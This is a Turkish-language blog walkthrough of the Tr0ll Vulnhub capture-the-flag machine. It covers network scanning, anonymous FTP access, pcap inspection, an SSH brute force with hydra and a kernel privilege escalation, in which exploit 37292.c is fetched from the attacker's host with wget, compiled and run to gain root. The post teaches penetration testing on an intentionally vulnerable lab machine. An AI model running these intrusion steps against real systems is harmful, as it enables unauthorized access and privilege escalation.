---
layout: post
title: "Tr0ll Vulnhub Writeup"
date: 2017-04-11
share: true
description: Tr0ll Vulnhub Writeup
tags:
 - vm
comments: true
---

# Tr0ll Vulnhub

Herkese merhabalar. Üniversite 1. sınıftan beri hep ertelediğim işi artık yapacağım! Yani Blog tutucam :) Elimden geldiğince faydalı olacağını düşündüğüm yazılar yazmaya çalışacağım. Umarım faydalı olur. O zaman başlayalım.

Bu yazı da sizlere Tr0ll isimli zaafiyetli makinenin çözümünü anlatacağım. Öncelikle makineyi indirmek için;

>[https://www.vulnhub.com/entry/tr0ll-1,100/](https://www.vulnhub.com/entry/tr0ll-1,100/)

Makinenin sanal ortamda kurulumunu tamamlandıktan sonra zaafiyetli makinenin ıp adresini tespit edip işe koyuluyoruz.
Benim kali makinemin ıp adresi 192.168.100.129.

	$ netdiscover -r 192.168.100.0/24 

![](/images/tr0ll/netd.png)
	
diyerekten makinenin ıp adresini buluyoruz.Bende 192.168.100.140 olarak gözüküyor. Ip adresini de bulduğumuza göre bir nmap taraması atıp yolumuzu buluyoruz.

![nmap](/images/nmap.png)

nmap parametrelerini kısaca açıklayayım;
>-sS - - - > SYN Scan. SYN bayraklı paketler yollar. Varsayılan olarak kullanılır ve oldukça hızlıdır.

>-sV - - - > Hangi servisin çalıştığını bilmek yetmez versiyon bilgileride lazımdır.Çalışan servislerin versiyon bilgisini verir.

>-A - - - > Agresif tarama yapar. İşletim sistemi bilgisini , servis ve versiyon bilgilerini verir.

>-Pn - - -> Ping atmadan taramayı gerçekleştirir.

>-p- - - - > Tüm portarı tarar.

Çıktılara bakarsak;

>1-) ftp servisi açık ve anonymous kullanıcılarına açık.
>2-) ssh servisi açık.
>3-) http servisi açık ve çoğu zaman karşılaştığımız robots.txt dosyası bulunuyor.(robots.txt dosyasına arama motorları tarafından indexlenmesini istemediğimiz url bilgilerini yazarız.)Ve secret url bulunuyor.

Öncelikle http servisinde neler bekliyor bizi bakıyoruz.

![](/images/tr0ll/1.png)

Kaynak koduna falan bakıyoruz. Cıks ekmek yok buradan. O zaman robots dosyasına göz gezdirelim.

![](/images/tr0ll/2.png)

![](/images/tr0ll/3.png)

Buradan da ekmek yok bize. O zaman ftp ye anonymous olarak giriş yapalım.

![](/images/tr0ll/4.png)

Kullanıcı adı anonymous password anonymous olarak giriş yapabiliyoruz. ls komutu ile burada neler tutuluyor diye baktığımızda lol.pcap adında dosyayı görüyoruz. Bildiğiniz gibi pcap dosyaları ağ trafiğini gösteren dosyalardır ve wireshark programı ile incelenebiliyor. Dosyayı isterseniz get dosyaAdi şeklinde kendi makinenize çekebilirsiniz isterseniz browser üzerinden ftp://ıp-adresi diyerekten görüntüleyip indirebilirsiniz.

![](/images/tr0ll/5.png)

Pcap dosyasını indirip wireshark ile incelediğimde bir FTP-DATA içerisinde bir mesajla karşılaşıyorum.

![](/images/tr0ll/6.png)

![](/images/tr0ll/8.png)

Bize sup3rs3cr3tdirlol bulmamızı söylüyor. Hemen browser üzerinde url'e yazıyoruz ve sonuc;

![](/images/tr0ll/9.png)

Dosyayı indirip file komutu ile baktığımda ELF dosyası olduğunu gördüm. Yani linux üzerinde çalışan bir dosya. Bu yüzden dosyaya chmod komutu ile çalıştırma izni verip çalıştırdım.

![](/images/tr0ll/10.png)

0x0856BF adresini bulmamızı istiyordu. Bu adresi aratırken bir anda istemeden bu makinenin çözümünü yazan elemanın sayfasında buldum kendimi. Ve yine url de aramamız gerekiyormuş. Hemen url'e bu değeri yazdım.

![](/images/tr0ll/11.png)

good_luck isimli klasöre girdiğimde which_one_lol.txt adlı dosya vardı ve içerinde kullanıcı isimleri bulunduruyordu. Diğer klasörün içerisinde ise Pass.txt dosyası bulunuyordu ve içinde 'Good_job_:)' yazıyordu.

Başta attığımız nmap taramasında hatırlarsanız ssh servisi açıktı ve bu kullanıcı isimleri ve parola ssh ile bağlanmamızı sağlayabilir. Bu yüzden bu dosyları indirip hydra aracı ile ssh servisine brute force yaptım.

Fakat denedim denedim olmadı işe yaramıyordu. Bu böyle olmazdı ve kopya çektim:) Ben Pass.txt dosyası içerisindeki 'Good_job_:)' yazısını paroladır ancak diye düşünüyordum fakat parola 'Pass.txt' imiş. Yani dosyanın ismi.

Makineyi hazırlayan arkadaşları tebrik ediyorum. Makine isminin hakkını veriyor abi. Tam troller...

Neyse hydra ile brute force yaptıktan sonra bakıyoruz ve BİNGO ...

![](/images/tr0ll/12.png)

Parametrelerden kısaca bahsedersem;

>-L - - - > Bu paramatre ile kullanıcı adlarının olduğu listeyi belirtiriz. Eğer '-l' olsaydı tek kullanıcı olduğunu belirtmiş olurduk. Burada dosya içersinden teker teker dener.
>-p - - - > Bu parametre ile parola olarak 'Pass.txt' kullanmasını söyledik.
>ssh - - - > ssh servisine brute force yapacağımız belirttik.

Ve kullanıcı adı 'overflow' parola 'Pass.txt' olduğunu öğrendik.

	ssh overflow@192.168.100.140

Ve içerdeyiz canım kurban.

![](/images/tr0ll/13.png)

Hemen kullanıcı bilgisine ve çekirdek bilgisine bakalım.

![](/images/tr0ll/14.png)

Burada root yetkisine sahip komutlara baktım acaba buradan yürüyebilirmiyim diye fakat birşey çıkmadı. Daha sonra öğrendiğim çekirdek bilgisinden yola çıkarak zaafiyetini aradım ve exploit-db de yayınlanmış olan zaafiyetini gördüm.

![](/images/tr0ll/15.png)

Exploit dosyasını kali makineme indirdim. Buradan python ile http servisi başlattım.

	python -m SimpleHTTPServer 8080
	
Ssh ile bağlandığım zaafiyetle makinede /tmp klasörine gittim. Linux da tmp klasörü geçici dosyalarının tutlduğu yerdir. Yani buraya dosya yazabilirsiniz. Burada ;

	wget http://192.168.100.129:8080/37292.c

komutu ile exploit dosyasını zaafiyetli makineye çektim.

Exploit dosyası c dosyası olduğu için öncelikle bu dosyayı derleyip çalışabilir hale getirdim.

	gcc 37292.c -o exploit 
	
![](/images/tr0ll/16.png)

Ve exploiti çalıştırdığımda artık rootum.

![](/images/tr0ll/17.png)

Artık root klasörüne gidebiliriz. Burada dikkatimizi proof.txt dosyası çekiyor . Zaten makinede okumamız istenen dosya bu. Ve Dosyayı okuduğumuzda Mission Complete...

![](/images/tr0ll/18.png)



















  











